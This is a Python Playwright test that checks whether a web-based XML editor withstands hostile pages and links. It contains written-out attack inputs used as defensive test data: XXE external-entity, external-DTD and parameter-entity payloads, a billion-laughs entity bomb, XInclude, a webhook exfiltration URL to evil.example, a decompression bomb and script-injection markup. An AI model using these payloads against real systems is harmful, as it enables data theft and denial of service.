"""What a hostile page or link must not be able to do.

    php -S 127.0.0.1:8103 -t src src/php/router.php          (in the project folder)
    python tests/security_test.py

- a page around the editor (iframe) or an opener reads no document it did
  not load itself (get before load), and a load never overwrites the user's
  own document of the same name;
- ?webhook= in a link is never stored, and without ?src= it is not used
  inside a page; at the top level the user is asked;
- an AI link that would replace an existing document asks first;
- a link that unpacks to a huge text is refused;
- the CSP is also in the page itself;
- an XML document with a DTD, external entities, an external DTD or an
  entity bomb loads nothing and expands nothing (no XXE)."""

import base64
import os
import subprocess
import sys
import tempfile
import time
import zlib

from playwright.sync_api import sync_playwright

EDITOR = os.environ.get('EDITOR_URL', 'http://127.0.0.1:8103/')
P = 'xmleditor'
HOOK = 'xmlEditor'
SECRET = '<?xml version="1.0"?>\n<doc>MY SECRET TEXT</doc>\n'
failures = []


def check_that(cond, what):
    """Print one result line and remember a failure.

    Args:
        cond (bool): whether the check passed.
        what (str): what was checked.

    Returns:
        None: the result is printed, a failure is added to the list.
    """
    print(('ok    ' if cond else 'FAIL  ') + what)
    if not cond:
        failures.append(what)


HOST = """<!doctype html><meta charset="utf-8"><title>evil</title>
<iframe id="f" src="SRC" style="width:1200px;height:700px;border:0"></iframe>
<script>
const P = 'PFX', ORIGIN = new URL('EDITOR').origin, frame = document.getElementById('f');
window.log = [];
addEventListener('message', e => {
  if (e.source !== frame.contentWindow) return;
  log.push(e.data);
  if (e.data.type === P + ':ready') frame.contentWindow.postMessage({ type: P + ':get' }, '*');
});
window.send = m => frame.contentWindow.postMessage(m, '*');
</script>"""

PORT8096 = 'http://127.0.0.1:8096'
XXE = {
    'external entity': f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY e SYSTEM "{PORT8096}/secret.txt">]>\n<r>&e;</r>',
    'external DTD': f'<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "{PORT8096}/evil.dtd">\n<r>&leak;</r>',
    'parameter entity': f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM "{PORT8096}/evil.dtd"> %p;]>\n<r>x</r>',
    'entity declared in the DTD': '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY e "EXPANDED">]>\n<r>&e;</r>',
    'billion laughs': '<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol">' + ''.join(f'<!ENTITY lol{i} "' + f'&lol{i - 1 if i > 1 else ""};' * 10 + '">' for i in range(1, 10)) + ']>\n<lolz>&lol9;</lolz>',
    'xml-stylesheet and xinclude': f'<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="{PORT8096}/evil.xsl"?>\n<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{PORT8096}/secret.txt" parse="text"/></r>',
}
hits = []

with tempfile.TemporaryDirectory() as d:
    with open(os.path.join(d, 'secret.txt'), 'w') as f:
        f.write('LEAKED')
    with open(os.path.join(d, 'evil.dtd'), 'w') as f:
        f.write('<!ENTITY leak "LEAKED">')
    with open(os.path.join(d, 'evil.xsl'), 'w') as f:
        f.write('<x>LEAKED</x>')
    def write_host_page(name, src):
        """Write a hostile host page that embeds the editor.

        Args:
            name (str): the file name.
            src (str): the address of the editor in the page.

        Returns:
            None: the page is in the temporary folder.
        """
        with open(os.path.join(d, name), 'w') as f:
            f.write(HOST.replace('SRC', src).replace('EDITOR', EDITOR).replace('PFX', P))
    write_host_page('get.html', EDITOR + '?embed=1')
    write_host_page('hook.html', EDITOR + '?embed=1&webhook=https://evil.example/c&auto')
    server = subprocess.Popen(['php', '-S', '127.0.0.1:8096', '-t', d], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.8)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(channel='chrome', headless=True)
            ctx = browser.new_context(viewport={'width': 1300, 'height': 800})
            errors = []
            ed = ctx.new_page()
            ed.on('pageerror', lambda e: errors.append(str(e)))
            ctx.on('request', lambda r: hits.append(r.url) if r.url.startswith(PORT8096) and not r.url.endswith('.html') and 'api.php' not in r.url else None)
            ed.goto(EDITOR, wait_until='networkidle')
            ed.wait_for_timeout(600)
            check_that(ed.locator('meta[http-equiv="Content-Security-Policy"]').count() == 1 and "script-src 'self'" in ed.get_attribute('meta[http-equiv="Content-Security-Policy"]', 'content'), 'the CSP is also in the page')
            # The user's own document, open when the page is visited next
            ed.evaluate(f'''t => {{ const id = {HOOK}.store.create('Dossier 17', t); }}''', SECRET)
            ed.evaluate(f'''t => {HOOK}.receive(t, 'set', {{ file: 'Dossier 17' }})''', SECRET)
            ed.wait_for_timeout(300)
            if ed.locator('#ask').is_visible():
                ed.click('#ask-ok')
            ed.wait_for_timeout(300)

            # A page that never loads a document asks for "the" document
            page = ctx.new_page()
            page.on('pageerror', lambda e: errors.append(str(e)))
            page.goto('http://127.0.0.1:8096/get.html', wait_until='load')
            page.wait_for_timeout(2500)
            saves = [m for m in page.evaluate('log') if m['type'] == P + ':save']
            check_that(saves and saves[0]['content'] is None and saves[0]['id'] is None, 'get before load answers with nothing')
            check_that('MY SECRET' not in str(page.evaluate('log')), 'no message carries the user\'s document')
            # A load with the name of the user's document does not overwrite it
            page.evaluate("send({ type: P + ':load', name: 'Dossier 17', content: 'overwritten' })")
            page.wait_for_timeout(800)
            frame = next(fr for fr in page.frames if fr.url.startswith(EDITOR))
            mine = frame.evaluate(f'''(() => {{ const f = {HOOK}.store.list().find(f => f.name === 'Dossier 17'); return {HOOK}.store.code(f.id); }})()''')
            loaded = frame.evaluate(f'''{HOOK}.store.list().filter(f => {HOOK}.store.code(f.id) === 'overwritten').map(f => f.name)''')
            check_that(mine == SECRET and len(loaded) == 1 and loaded[0] != 'Dossier 17', 'a load never overwrites the user\'s own document (it becomes a new one): ' + str(loaded))
            page.evaluate("send({ type: P + ':get' })")
            page.wait_for_timeout(300)
            check_that(page.evaluate('log[log.length - 1]')['content'] == 'overwritten', 'get then answers with the page\'s own document only')
            page.close()

            # ?webhook= inside a page without ?src=: not used, not stored
            page = ctx.new_page()
            page.goto('http://127.0.0.1:8096/hook.html', wait_until='load')
            page.wait_for_timeout(2000)
            frame = next(fr for fr in page.frames if fr.url.startswith(EDITOR))
            check_that('evil.example' not in frame.evaluate('JSON.stringify(localStorage)'), 'a webhook in an embedded link is not stored')
            check_that('only works together with ?src=' in frame.inner_text('#toast'), 'and not used without ?src=')
            page.close()

            # ?embed=1&webhook= at the top level: the user is asked, and it is never stored
            top = ctx.new_page()
            top.goto(EDITOR + '?embed=1&webhook=https://evil.example/c&auto', wait_until='networkidle')
            top.wait_for_timeout(800)
            check_that(top.locator('#ask').is_visible() and 'evil.example' in top.inner_text('#ask'), 'a top-level link with a webhook asks first')
            top.click('#ask-ok')
            top.wait_for_timeout(200)
            check_that('evil.example' not in top.evaluate('JSON.stringify(localStorage)'), 'even when allowed, it is not stored')
            top.close()

            # An AI link names the document it changes: no question, and Undo takes the change back
            junk = '<doc>junk</doc>'
            ed.bring_to_front()
            ed.goto(EDITOR + '#b64=' + base64.urlsafe_b64encode(junk.encode()).decode() + '&file=Dossier%2017', wait_until='networkidle')
            ed.wait_for_timeout(800)
            check_that(not ed.locator('#ask').is_visible() and ed.evaluate(f'{HOOK}.state.name') == 'Dossier 17', 'an AI link changes the document it names without a question')
            ed.click('#btn-undo')
            ed.wait_for_timeout(400)
            mine = ed.evaluate(f'''(() => {{ const f = {HOOK}.store.list().find(f => f.name === 'Dossier 17'); return {HOOK}.store.code(f.id); }})()''')
            check_that(mine == SECRET, 'Undo brings the document back')

            # A link that unpacks to more than 5 MB
            bomb = base64.urlsafe_b64encode(zlib.compress(b' ' * 20_000_000, 9)).decode().rstrip('=')
            ed.goto(EDITOR + '#z=' + bomb + '&file=new&name=bomb', wait_until='networkidle')
            ed.wait_for_timeout(1500)
            check_that('bomb' not in ed.evaluate(f'{HOOK}.store.list().map(f => f.name)'), 'a link that unpacks to a huge text is refused')

            # XXE: DTDs and entities are never loaded, entity bombs never expanded
            ed.goto(EDITOR, wait_until='networkidle')
            ed.wait_for_timeout(500)
            hits.clear()
            for name, xml in XXE.items():
                ed.evaluate(f'c => {HOOK}.setCode(c)', xml)
                ed.wait_for_timeout(500)
                tree = ed.inner_text('#tree')
                check_that('LEAKED' not in tree and 'LEAKED' not in ed.evaluate(f'{HOOK}.state.result.doc ? new XMLSerializer().serializeToString({HOOK}.state.result.doc) : ""'), f'{name}: no external content in the tree or the parsed document')
            ed.wait_for_timeout(800)
            check_that(not hits, 'no request for a DTD or an entity reached the server: ' + str(hits))
            ed.evaluate(f'c => {HOOK}.setCode(c)', XXE['entity declared in the DTD'])
            ed.wait_for_timeout(400)
            texts = ed.evaluate('[...document.querySelectorAll("#tree .tx")].map(e => e.textContent).join("|")')
            check_that('&e;' in texts and 'EXPANDED' not in texts and any('not expanded' in p['msg'] or 'not loaded' in p['msg'] for p in ed.evaluate(f'{HOOK}.state.result.problems')), 'an entity of the DTD stays as written, with a note')
            import time as _t
            t0 = _t.time()
            ed.evaluate(f'c => {HOOK}.setCode(c)', XXE['billion laughs'])
            ed.wait_for_timeout(300)
            check_that(_t.time() - t0 < 5 and len(ed.inner_text('#tree')) < 5000, 'an entity bomb is not expanded')
            ed.evaluate(f'c => {HOOK}.setCode(c)', '<a><b onclick="alert(1)">x</b><script>window.pwned = 1</script><img src="x" onerror="window.pwned = 1"/></a>')
            ed.wait_for_timeout(500)
            ed.locator('#tree .s.ed').first.click()
            ed.keyboard.press('Escape')
            check_that(not ed.evaluate('window.pwned') and ed.locator('#tree img, #tree script').count() == 0, 'markup in the document stays text in the tree')
            check_that(not errors, 'no script errors' + (': ' + '; '.join(errors) if errors else ''))
            browser.close()
    finally:
        server.terminate()

print(f'\n{len(failures)} failed' if failures else '\nall passed')
sys.exit(1 if failures else 0)
